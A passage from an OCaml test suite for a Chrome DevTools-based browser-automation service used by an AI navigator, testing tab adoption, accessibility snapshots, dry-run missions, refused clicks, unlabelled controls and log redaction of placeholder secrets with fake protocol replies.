          | `List rows when List.length rows = 2 ->
              List.iter
                (fun row ->
                  Alcotest.(check bool)
                    "kind-a7uy about:blank and human chrome://newtab have no kind" true
                    (field "page_kind" row = None))
                rows
          | _ ->
              Eio.Fiber.yield ();
              await (n - 1)
      in
      await 1000;
      ignore (result (request tabs "alice" (P.Close { tab = agent }))))

let human
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      let agent =
        result (request tabs "alice" (P.New { url = None; label = None })) |> tab
      in
      Fake.emit (fake ()) ~method_:"Target.attachedToTarget"
        ~params:
          (obj
             [
               ("sessionId", str "human-session");
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "human-target");
                     ("type", str "page");
                     ("url", str "https://human.example/");
                     ("title", str "human");
                   ] );
             ]);
      let rec await n =
        if n = 0 then Alcotest.fail "human tab not adopted"
        else
          match get "tabs" (result (request tabs "alice" P.List_tabs)) with
          | `List [ _; _ ] -> ()
          | _ ->
              Eio.Fiber.yield ();
              await (n - 1)
      in
      await 1000;
      let human_tab =
        result
          (request tabs "any"
             (P.Take { url = Some "https://human.example/"; title = None; label = None }))
        |> tab
      in
      Fake.on_method (fake ()) "Runtime.evaluate" (fun request ->
          if
            get "expression" (get "params" request)
            = str Leash__Snapshot_source.interactive_count_expression
          then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
          else
            obj
              [
                ( "result",
                  obj
                    [
                      ("type", str "object");
                      ( "value",
                        obj
                          [
                            ("epoch", str "human-doc");
                            ("count", `Int 0);
                            ("width", `Int 800);
                            ("height", `Int 600);
                          ] );
                    ] );
              ]);
      (* own-jua9: a tab discovered from outside Leash is human without a handle, so a client —
         here takes it before it may observe it. *)
      ignore
        (result
           (request tabs "human"
              (P.Snap
                 {
                   tab = human_tab;
                   match_ = None;
                   limit = None;
                   offset = None;
                   with_image = None;
                 })));
      Alcotest.(check bool)
        "tab-of0i adopted page installed" true
        (Fake.received (fake ())
        |> List.exists (fun x ->
            field "method" x = Some (str "Page.addScriptToEvaluateOnNewDocument")
            && field "sessionId" x = Some (str "human-session")));
      let before = Fake.received (fake ()) |> List.length in
      Leash.Tabs.stop tabs;
      let closed =
        Fake.received (fake ())
        |> List.filteri (fun i _ -> i >= before)
        |> List.filter (fun x -> field "method" x = Some (str "Target.closeTarget"))
      in
      Alcotest.(check int)
        "taken human tab permanently becomes agent" 2 (List.length closed);
      ignore agent)

(* Blank the accessible name Chrome computed from the placeholder: the shape a control
   whose name the author suppressed has, while its DOM attribute stays. *)
let nameless_placeholder ax =
  let blank (node : Yojson.Safe.t) (fields : (string * Yojson.Safe.t) list) =
    let name : Yojson.Safe.t =
      match field "name" node with
      | Some (`Assoc name) ->
          `Assoc
            (List.map (fun (k, v) -> if k = "value" then (k, str "") else (k, v)) name)
      | _ -> `Null
    in
    `Assoc (("name", name) :: List.remove_assoc "name" fields)
  in
  match field "nodes" ax with
  | Some (`List nodes) ->
      let nodes =
        List.map
          (fun (node : Yojson.Safe.t) ->
            match field "name" node with
            | Some (`Assoc name)
              when List.assoc_opt "value" name = Some (str "Search terms") -> (
                match node with `Assoc fields -> blank node fields | _ -> node)
            | _ -> node)
          nodes
      in
      obj [ ("nodes", `List nodes) ]
  | _ -> ax

(* tab-of0i tab-tmoc tab-1r34 tab-hyap tab-1rx9 tab-0vh8.
   AX and DOMSnapshot replies below are copied from headless Chrome 152, not invented. *)
let fixture name =
  let load path = Yojson.Safe.from_file path in
  try load ("fixtures/" ^ name) with Sys_error _ -> load ("test/fixtures/" ^ name)

let snapshot_fixture () = fixture "snapshot-chrome.json"

(* daily-9ggi: real Chrome 152 replies, private headless service, device scale 2. *)
let daily_snapshot
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  List.iter
    (fun site ->
      rig ~caps (fun _ _ _ tabs fake ->
          let fake = fake () in
          let captured = get site (fixture "daily-snapshot-chrome.json") in
          Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" captured);
          Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" captured);
          Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" captured);
          let scroll_y = ref 0 in
          Fake.on_method fake "Runtime.evaluate" (fun request ->
              if
                get "expression" (get "params" request)
                = str Leash__Snapshot_source.interactive_count_expression
              then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
              else
                obj
                  [
                    ( "result",
                      obj
                        [
                          ( "value",
                            obj
                              [
                                ("epoch", str "daily-9ggi");
                                ("count", `Int 1);
                                ("width", `Int 1366);
                                ("height", `Int 813);
                                ("scrollY", `Int !scroll_y);
                                ("devicePixelRatio", `Int 2);
                              ] );
                        ] );
                  ]);
          let tab =
            result (request tabs "alice" (P.New { url = None; label = None })) |> tab
          in
          let snap () =
            result
              (request tabs "alice"
                 (P.Snap
                    { tab; match_ = None; limit = None; offset = None; with_image = None }))
          in
          let rows json = match get "rows" json with `List xs -> xs | _ -> [] in
          let observed = rows (snap ()) in
          let has role name =
            List.exists
              (fun row -> get "role" row = str role && get "name" row = str name)
              observed
          in
          if site = "httpbin" then (
            List.iter
              (fun (role, name) ->
                Alcotest.(check bool) ("daily-9ggi visible " ^ name) true (has role name))
              [
                ("textbox", "Preferred delivery time: ");
                ("textbox", "Delivery instructions: ");
                ("button", "Submit order");
              ];
            Alcotest.(check int)
              "daily-9ggi all thirteen form controls" 13
              (List.length
                 (List.filter (fun row -> get "role" row <> str "paragraph") observed));
            scroll_y := 650;
            Alcotest.(check int)
              "daily-9ggi device-scaled scroll clips the form" 0
              (List.length (rows (snap ()))))
          else (
            Alcotest.(check bool)
              "daily-9ggi Learn more remains actionable" true (has "link" "Learn more");
            let paragraphs =
              List.filter (fun row -> get "role" row = str "paragraph") observed
            in
            Alcotest.(check int)
              "daily-9ggi one row per language paragraph" 6 (List.length paragraphs);
            Alcotest.(check string)
              "daily-9ggi complete English text, not characters"
              "This domain is for use in documentation examples without needing \
               permission. This is not a service, avoid relying on it for testing and \
               monitoring purposes."
              (match paragraphs with
              | row :: _ -> ( match get "name" row with `String s -> s | _ -> "")
              | [] -> ""))))
    [ "httpbin"; "example" ]

let snapshot
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = snapshot_fixture () in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      let guard_reads = ref 0 in
      let mutating = ref false in
      let scroll_y = ref 0 in
      Fake.on_method fake "Runtime.evaluate" (fun request ->
          if
            get "expression" (get "params" request)
            = str Leash__Snapshot_source.interactive_count_expression
          then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
          else (
            incr guard_reads;
            let counter = if !mutating then !guard_reads else 1 in
            obj
              [
                ( "result",
                  obj
                    [
                      ("type", str "object");
                      ( "value",
                        obj
                          [
                            ("epoch", str "document-1");
                            ("count", `Int counter);
                            ("width", `Int 800);
                            ("height", `Int 600);
                            ("scrollY", `Int !scroll_y);
                          ] );
                    ] );
              ]));
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      let snap ?match_ ?limit ?offset () =
        result
          (request tabs "alice"
             (P.Snap { tab = h; match_; limit; offset; with_image = None }))
      in
      let first = snap () in
      Alcotest.(check bool) "tab-of0i settled" true (get "settled" first = `Bool true);
      Alcotest.(check bool)
        "kind-a7uy blank snapshot has no page kind" true
        (field "page_kind" first = None);
      Alcotest.(check int)
        "tab-tmoc field-vji1 visible rows including cross-origin frame" 3
        (get "total" first |> function `Int n -> n | _ -> -1);
      Alcotest.(check string)
        "tab-of0i reading order" "fresh doc"
        (match get "rows" first with
        | `List (x :: _) -> ( match get "name" x with `String s -> s | _ -> "")
        | _ -> "");
      let calls = List.length (Fake.received fake) in
      check_code "tab-1rx9 reject negative offset" "invalid-request"
        (request tabs "alice"
           (P.Snap
              {
                tab = h;
                match_ = None;
                limit = None;
                offset = Some (-1);
                with_image = None;
              }));
      Alcotest.(check int)
        "tab-1rx9 no CDP on invalid request" calls
        (List.length (Fake.received fake));
      ignore
        (result
           (request tabs "bob"
              (P.Snap
                 {
                   tab = h;
                   match_ = None;
                   limit = None;
                   offset = None;
                   with_image = None;
                 })));
      let bad =
        match P.Handle.of_string "t_not_a_tab" with
        | Ok h -> h
        | Error e -> Alcotest.fail e
      in
      check_code "hand-scaz a handle you do not hold" "unknown-tab"
        (request tabs "bob"
           (P.Snap
              { tab = bad; match_ = None; limit = None; offset = None; with_image = None }));
      let filtered = snap ~match_:"GO" ~limit:0 () in
      Alcotest.(check int)
        "tab-hyap matched total" 1
        (match get "total" filtered with `Int n -> n | _ -> -1);
      Alcotest.(check bool)
        "tab-1rx9 truncated" true
        (get "truncated" filtered = `Bool true);
      Alcotest.(check bool)
        "tab-1r34 new id" true
        (get "snapshot" first <> get "snapshot" filtered);
      let page = snap ~offset:2 ~limit:1 () in
      Alcotest.(check bool)
        "tab-1rx9 last page" true
        (get "total" page = `Int 3 && get "truncated" page = `Bool false);
      (* tab-tmoc: real Chrome DOMSnapshot bounds are document-relative.
         At scrollY=150, the top heading leaves the viewport while Go stays. *)
      scroll_y := 150;
      let scrolled = snap () in
      Alcotest.(check int)
        "tab-tmoc field-vji1 scrolled total including frame" 2
        (match get "total" scrolled with `Int n -> n | _ -> -1);
      Alcotest.(check string)
        "tab-tmoc scrolled row" "Go"
        (match get "rows" scrolled with
        | `List (row :: _) -> (
            match get "name" row with `String name -> name | _ -> "")
        | _ -> "");
      Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogOpening"
        ~params:
          (obj
             [
               ("type", str "alert");
               ("message", str "stay here");
               ("url", str "http://localhost/");
               ("hasBrowserHandler", `Bool true);
             ]);
      let rec wait_dialog n =
        if n = 0 then Alcotest.fail "dialog event was not delivered"
        else
          match
            Leash.Tabs.snap tabs
              { tab = h; match_ = None; limit = None; offset = None; with_image = None }
          with
          | Ok { dialog = Some _; _ } -> ()
          | _ ->
              Eio.Fiber.yield ();
              wait_dialog (n - 1)
      in
      wait_dialog 100;
      let dialog = snap () in
      Alcotest.(check bool)
        "tab-0vh8 dialog" true
        (get "message" (get "dialog" dialog) = str "stay here");
      Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogClosed"
        ~params:(obj [ ("result", `Bool false); ("userInput", str "") ]);
      let rec wait_clear n =
        if n = 0 then Alcotest.fail "dialog closure was not delivered"
        else
          let current = snap () in
          if get "dialog" current = `Null then ()
          else (
            Eio.Fiber.yield ();
            wait_clear (n - 1))
      in
      wait_clear 100;
      mutating := true;
      let before = !guard_reads in
      let unsettled = snap () in
      Alcotest.(check bool)
        "tab-of0i unsettled" true
        (get "settled" unsettled = `Bool false);
      Alcotest.(check int) "tab-of0i at most two retakes" 6 (!guard_reads - before);
      let methods =
        Fake.received fake
        |> List.filter_map (fun j ->
            match field "method" j with Some (`String x) -> Some x | _ -> None)
      in
      Alcotest.(check bool)
        "tab-of0i counter installed on attach" true
        (List.mem "Page.addScriptToEvaluateOnNewDocument" methods))

(* fly-iodm: one Runtime.evaluate whose expression contains leash-operator-read.
   Snap and checker expressions keep the recorded guard and innerText answers. Height is
   the fixture's old scroll height, so a page that could scroll down still can. *)
let operator_observation ~text =
  obj
    [
      ("kind", str "leash-operator");
      ("url", str "https://example.com/");
      ("title", str "Example");
      ("timeOrigin", `Int 1);
      ("text", str text);
      ("truncated", `Bool false);
      ("omitted", `Int 0);
      ( "scroll",
        obj
          [
            ("x", `Int 0);
            ("y", `Int 0);
            ("height", `Int 1000);
            ("viewport", `Int 600);
            ("width", `Int 800);
          ] );
      ("semantics", `List []);
      ("guard", obj []);
    ]

let page_evaluate ~text fixture request =
  let expression = get "expression" (get "params" request) in
  match expression with
  | `String s when s = Leash__Snapshot_source.interactive_count_expression ->
      obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
  | `String "globalThis" -> obj [ ("result", obj [ ("objectId", str "global-object") ]) ]
  | `String s when contains s "leash-operator-read" ->
      obj
        [
          ("result", obj [ ("type", str "object"); ("value", operator_observation ~text) ]);
        ]
  | `String s when String.starts_with ~prefix:"Array.from(document.body?.innerText" s ->
      obj [ ("result", obj [ ("type", str "object"); ("value", str text) ]) ]
  | _ ->
      obj [ ("result", obj [ ("type", str "object"); ("value", get "guard" fixture) ]) ]

(* drive-l7yk drive-8n2z: a real control request, captured headless Chrome
   snapshot replies, scripted decision and no browser mutation. *)
let with_ticking_clock ?(tick_ms = 1) ?(ticks = 500_000) env sw f =
  let stop = ref false in
  Eio.Fiber.fork ~sw (fun () ->
      let rec tick n =
        if n = 0 || !stop then ()
        else (
          Ox_test.advance env#clock (Ox.Duration.ms tick_ms);
          tick (n - 1))
      in
      tick ticks);
  Fun.protect ~finally:(fun () -> stop := true) f

let drive_dry_run
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun env sw _ tabs fake ->
      with_ticking_clock ~tick_ms:1 ~ticks:500_000 env sw (fun () ->
          let fake = fake () in
          let fixture = fixture "unlabelled-controls-chrome.json" in
          Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
          Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
          Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
          Fake.on_method fake "Runtime.evaluate"
            (page_evaluate ~text:"Example content" fixture);
          Fake.on_method fake "Runtime.callFunctionOn" (fun request ->
              let body = get "functionDeclaration" (get "params" request) in
              Alcotest.(check bool)
                "drive-l7yk metric body returns a value" true
                (match body with
                | `String s ->
                    String.starts_with ~prefix:"function(argument) {\nreturn {y:" s
                | _ -> false);
              obj
                [
                  ( "result",
                    obj
                      [
                        ( "value",
                          obj
                            [
                              ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000);
                            ] );
                      ] );
                ]);
          let h =
            result (request tabs "alice" (P.New { url = None; label = None })) |> tab
          in
          let decisions = ref 0 in
          let decide ~deadline:_ (_ : Leash__Jev_request.request) =
            incr decisions;
            let operation =
              match P.Operation.of_string "click" with
              | Ok x -> x
              | Error _ -> assert false
            in
            Ok
              Leash__Jev_request.
                {
                  operation;
                  script = None;
                  index = Some 1;
                  option = None;
                  confidence = 1.;
                  target_confidence = None;
                  operation_probabilities = [ ("click", 1.) ];
                  target_probabilities = [];
                  targets = [];
                }
          in
          let wire =
            P.encode_request
              {
                command =
                  P.Drive
                    {
                      tab = Some h;
                      mission = "Open a result";
                      max_steps = None;
                      start_url = Some "https://example.com/";
                      max_procedures = Some 3;
                      expect = None;
                      out = None;
                      secrets = [];
                      deadline_s = Some 30;
                      dry_run = Some true;
                    };
              }
            |> Yojson.Safe.to_string
          in
          let reply =
            Leash.Control.handle ~model:"fixture-model" ~installed:[] ~decide
              ~levels:
                {
                  (levels_with [] (ref [])) with
                  plan =
                    (fun ~deadline:_ request ->
                      Ok
                        Run.
                          {
                            answer = Leg request.mission;
                            expect = [];
                            reasoning_summary = Some "Would open the result";
                            secrets_for_operator = [];
                            usage = None;
                          });
                }
              tabs wire
            |> Yojson.Safe.from_string |> P.decode_reply
          in
          let reply =
            match reply with Ok reply -> result reply | Error why -> Alcotest.fail why
          in
          Alcotest.(check string)
            "pilot-r94o dry-run is planned" "planned"
            (match get "status" reply with `String s -> s | _ -> "");
          Alcotest.(check int) "pilot-r94o navigator never runs" 0 !decisions;
          Alcotest.(check int)
            "pilot-r94o no executed steps" 0
            (match get "operator_steps" reply with `List xs -> List.length xs | _ -> 0);
          Alcotest.(check bool)
            "drive-l7yk no mutating browser operation" false
            (List.exists
               (fun json ->
                 match field "method" json with
                 | Some
                     (`String
                        ( "Input.dispatchMouseEvent" | "Input.insertText"
                        | "DOM.scrollIntoViewIfNeeded" )) ->
                     true
                 | _ -> false)
               (Fake.received fake))))

(* tab-bw4j drive-y7v8: a click refused before any input is not an uncertain
   outcome. JEV is shown the page again and may choose a different action. *)
let refused_click_redecides
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) ?(operation_name = "click") () =
  let role = if operation_name = "type_text" then "textbox" else "button" in
  rig ~caps (fun env sw _ tabs fake ->
      let fake = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      Fake.on_method fake "Runtime.evaluate"
        (page_evaluate ~text:"Example content" fixture);
      Fake.on_method fake "Runtime.callFunctionOn" (fun _ ->
          obj
            [
              ( "result",
                obj
                  [
                    ( "value",
                      obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ]
                    );
                  ] );
            ]);
      Fake.on_method fake "Accessibility.getPartialAXTree" (fun _ ->
          obj
            [
              ( "nodes",
                `List
                  [
                    obj
                      [
                        ("role", obj [ ("value", str role) ]);
                        ("name", obj [ ("value", str "") ]);
                      ];
                  ] );
            ]);
      Fake.on_method fake "DOM.describeNode" (fun _ ->
          obj
            [
              ( "node",
                obj
                  [
                    ("nodeId", `Int 29);
                    ("backendNodeId", `Int 29);
                    ("nodeName", str "DIV");
                  ] );
            ]);
      Fake.on_method fake "DOM.getContentQuads" (fun _ ->
          obj
            [
              ( "quads",
                `List
                  [
                    `List
                      (List.map
                         (fun x -> `Float x)
                         [ 10.; 10.; 50.; 10.; 50.; 30.; 10.; 30. ]);
                  ] );
            ]);
      Fake.on_method fake "Page.getLayoutMetrics" (fun _ ->
          obj [ ("cssLayoutViewport", obj [ ("pageX", `Int 0); ("pageY", `Int 0) ]) ]);
      Fake.on_method fake "DOM.getNodeForLocation" (fun _ ->
          obj [ ("backendNodeId", `Int 999) ]);
      Fake.on_method fake "Target.getTargetInfo" (fun _ ->
          obj
            [
              ( "targetInfo",
                obj
                  [
                    ("targetId", str "target-1");
                    ("type", str "page");
                    ("title", str "Example");
                    ("url", str "https://example.com/");
                  ] );
            ]);
      Fake.on_method fake "Page.navigate" (fun request ->
          let session =
            match get "sessionId" request with `String s -> s | _ -> "session-1"
          in
          Fake.emit ~session fake ~method_:"Page.frameNavigated"
            ~params:(Fake.event "Page.frameNavigated");
          Fake.emit ~session fake ~method_:"Page.loadEventFired"
            ~params:(Fake.event "Page.loadEventFired");
          obj [ ("frameId", str "frame-1"); ("loaderId", str "loader-2") ]);
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      let observed =
        result
          (request tabs "alice"
             (P.Snap
                { tab = h; match_ = None; limit = None; offset = None; with_image = None }))
      in
      let rows = match get "rows" observed with `List rows -> rows | _ -> [] in
      let index =
        match
          List.find_opt
            (fun row -> get "role" row = str role && get "name" row = str "")
            rows
        with
        | Some row -> ( match get "index" row with `Int i -> i | _ -> assert false)
        | None -> Alcotest.fail "icon button absent from snapshot"
      in
      let decisions = ref 0 in
      let decide ~deadline:_ (_ : Leash__Jev_request.request) =
        incr decisions;
        let operation =
          match
            P.Operation.of_string (if !decisions = 1 then operation_name else "done")
          with
          | Ok operation -> operation
          | Error _ -> assert false
        in
        Ok
          Leash__Jev_request.
            {
              operation;
              script = None;
              index = Some index;
              option = None;
              confidence = 1.;
              target_confidence = None;
              operation_probabilities = [ (P.Operation.to_string operation, 1.) ];
              target_probabilities = [];
              targets = [];
            }
      in
      let wire =
        P.encode_request
          {
            command =
              P.Drive
                {
                  tab = Some h;
                  mission = "Open a result";
                  max_steps = Some 4;
                  start_url = Some "https://example.com/";
                  max_procedures = None;
                  expect = None;
                  out = None;
                  secrets = [];
                  deadline_s = Some 30;
                  dry_run = None;
                };
          }
        |> Yojson.Safe.to_string
      in
      let reply =
        with_ticking_clock ~tick_ms:1 ~ticks:500_000 env sw (fun () ->
            Leash.Control.handle ~model:"fixture-model" ~installed:[] ~decide
              ~levels:(levels_with [] (ref []))
              ~text_helper:(fun () ->
                Leash.Text_helper.
                  { complete = (fun ?deadline:_ _ -> Ok (Some "2026-11-01")) })
              tabs wire)
        |> Yojson.Safe.from_string |> P.decode_reply
      in
      let reply =
        match reply with Ok reply -> result reply | Error why -> Alcotest.fail why
      in
      let status = match get "status" reply with `String s -> s | _ -> "" in
      let reason = match field "reason" reply with Some (`String s) -> s | _ -> "" in
      if status <> "done" then
        Alcotest.failf "status %s after %d decisions; reason %s" status !decisions reason;
      Alcotest.(check int) "tab-bw4j JEV decides again" 2 !decisions;
      Alcotest.(check bool)
        "tab-bw4j the refusal dispatched no mouse input" false
        (List.exists
           (fun json ->
             List.mem (field "method" json)
               [ Some (str "Input.dispatchMouseEvent"); Some (str "Input.insertText") ])
           (Fake.received fake));
      Alcotest.(check bool)
        "tab-bw4j the refusal is not outcome uncertain" false
        (contains (Yojson.Safe.to_string reply) "outcome uncertain"))

(* tab-zc36: a control with an empty accessible name is what an agent still has to act on,
   so it keeps its row with its role, an empty name, and its value or placeholder. The AX
   and DOMSnapshot replies are the recorded headless Chrome 152 shapes for a page with an
   unlabelled native select, a bare text input, an input whose only text is a placeholder,
   and an icon button with no name (test/fixtures/unlabelled-controls-chrome.json). *)
let empty_names
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      let guard = get "guard" fixture in
      Fake.on_method fake "Runtime.evaluate" (fun request ->
          if
            get "expression" (get "params" request)
            = str Leash__Snapshot_source.interactive_count_expression
          then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
          else obj [ ("result", obj [ ("type", str "object"); ("value", guard) ]) ]);
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      let snapshot () =
        result
          (request tabs "alice"
             (P.Snap
                { tab = h; match_ = None; limit = None; offset = None; with_image = None }))
      in
      let rows json = match get "rows" json with `List rows -> rows | _ -> [] in
      let value row = match field "value" row with Some (`String v) -> v | _ -> "" in
      let named role name json =
        List.find_opt
          (fun row -> get "role" row = str role && get "name" row = str name)
          (rows json)
      in
      let first = snapshot () in
      (match named "combobox" "" first with
      | Some row ->
          Alcotest.(check string)
            "tab-zc36 the unlabelled select keeps its value" "Alpha" (value row)
      | None -> Alcotest.fail "tab-zc36 the unlabelled select is missing from the table");
      (match named "textbox" "" first with
      | Some _ -> ()
      | None -> Alcotest.fail "tab-zc36 the bare text input is missing from the table");
      (match named "button" "" first with
      | Some _ -> ()
      | None -> Alcotest.fail "tab-zc36 the icon button is missing from the table");
      (match named "textbox" "Search terms" first with
      | Some _ -> ()
      | None -> Alcotest.fail "tab-zc36 the placeholder-named input is missing");
      Alcotest.(check bool)
        "tab-zc36 every row has an index to act on" true
        (List.for_all
           (fun row -> match field "index" row with Some (`Int i) -> i > 0 | _ -> false)
           (rows first));
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ ->
          nameless_placeholder (get "ax" fixture));
      let second = snapshot () in
      Alcotest.(check bool)
        "tab-zc36 a nameless control shows its placeholder" true
        (List.exists
           (fun row -> get "name" row = str "" && value row = "Search terms")
           (rows second)))

(* tab-bw4j, L34: a button icon's ::before pseudo-element belongs to its row,
   while an unrelated overlay does not. *)
let pseudo_icon_hit
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      let fake = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
      Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
      Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
      Fake.on_method fake "Runtime.evaluate" (fun request ->
          if
            get "expression" (get "params" request)
            = str Leash__Snapshot_source.interactive_count_expression
          then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
          else obj [ ("result", obj [ ("value", get "guard" fixture) ]) ]);
      Fake.on_method fake "Accessibility.getPartialAXTree" (fun _ ->
          obj
            [
              ( "nodes",
                `List
                  [
                    obj
                      [
                        ("role", obj [ ("value", str "button") ]);
                        ("name", obj [ ("value", str "") ]);
                      ];
                  ] );
            ]);
      Fake.on_method fake "DOM.describeNode" (fun request ->
          let icon =
            obj
              [
                ("backendNodeId", `Int 30);
                ("pseudoElements", `List [ obj [ ("backendNodeId", `Int 894) ] ]);
              ]
          in
          let node = [ ("nodeId", `Int 29); ("backendNodeId", `Int 29) ] in
          let depth = field "depth" (get "params" request) in
          obj
            [
              ( "node",
                obj
                  (if depth = Some (`Int (-1)) then ("children", `List [ icon ]) :: node
                   else node) );
            ]);
      Fake.on_method fake "DOM.getContentQuads" (fun _ ->
          obj
            [
              ( "quads",
                `List
                  [
                    `List
                      (List.map
                         (fun x -> `Float x)
                         [ 10.; 10.; 50.; 10.; 50.; 30.; 10.; 30. ]);
                  ] );
            ]);
      let hit = ref 894 in
      Fake.on_method fake "DOM.getNodeForLocation" (fun _ ->
          obj [ ("backendNodeId", `Int !hit) ]);
      let tab =
        result (request tabs "alice" (P.New { url = None; label = None })) |> tab
      in
      let observed =
        result
          (request tabs "alice"
             (P.Snap
                { tab; match_ = None; limit = None; offset = None; with_image = None }))
      in
      let rows = match get "rows" observed with `List rows -> rows | _ -> [] in
      let index =
        match
          List.find_opt
            (fun row -> get "role" row = str "button" && get "name" row = str "")
            rows
        with
        | Some row -> ( match get "index" row with `Int i -> i | _ -> assert false)
        | None -> Alcotest.fail "icon button absent from snapshot"
      in
      let snapshot =
        match get "snapshot" observed with
        | `String id -> (
            match P.Snapshot_id.of_string id with
            | Ok id -> id
            | Error why -> Alcotest.fail why)
        | _ -> Alcotest.fail "snapshot id missing"
      in
      ignore
        (result
           (request tabs "alice"
              (P.Click { tab; snapshot; index; snap = None; match_ = None; limit = None })));
      let dispatched () =
        Fake.received fake
        |> List.filter (fun json ->
            field "method" json = Some (str "Input.dispatchMouseEvent"))
        |> List.length
      in
      let before = dispatched () in
      Alcotest.(check int) "tab-bw4j pseudo-icon dispatched press and release" 2 before;
      hit := 999;
      check_code "tab-bw4j unrelated overlay still blocks click" "row-not-actionable"
        (request tabs "alice"
           (P.Click { tab; snapshot; index; snap = None; match_ = None; limit = None }));
      Alcotest.(check int)
        "tab-bw4j overlay dispatches no mouse input" before (dispatched ()))

(* svc-p67t svc-qilu: inspect every command anchor and every journal line of a
   scripted tab session; page data and credentials must never become a log line. *)
let journal_redaction
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  let module L = Ox_observability.Logger in
  let memory = L.Memory.create () in
  rig ~caps ~reporter:(L.Memory.reporter memory) (fun env _ _ tabs fake ->
      let logger =
        L.create ~service:"leash-test" ~clock:env#clock ~mono_clock:env#mono_clock
          ~reporter:(L.Memory.reporter memory) ()
      in
      let secret_fill = "fill-secret-do-not-log" in
      let secret_text = "page-text-do-not-log" in
      let api_key = "api-key-do-not-log" in
      let userinfo = "userinfo-do-not-log" in
      (* L36: what the request ring, the cookie jar and the upload path hold is page or
         caller data as well. *)
      let secret_request = "request-secret-do-not-log" in
      let secret_cookie = "cookie-secret-do-not-log" in
      let secret_path = "/nonexistent/path-secret-do-not-log" in
      let url = "https://user:" ^ userinfo ^ "@example.com/" in
      Fake.on_method (fake ()) "Runtime.evaluate" (fun request ->
          if
            get "expression" (get "params" request)
            = str Leash__Snapshot_source.interactive_count_expression
          then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
          else obj [ ("result", obj [ ("value", str secret_text) ]) ]);
      let run who command =
        let request = P.{ command } in
        let wire = P.encode_request request |> Yojson.Safe.to_string in
        let reply = Leash.Control.handle ~logger tabs wire |> Yojson.Safe.from_string in
        match P.decode_reply reply with Ok result -> result | Error e -> Alcotest.fail e
      in
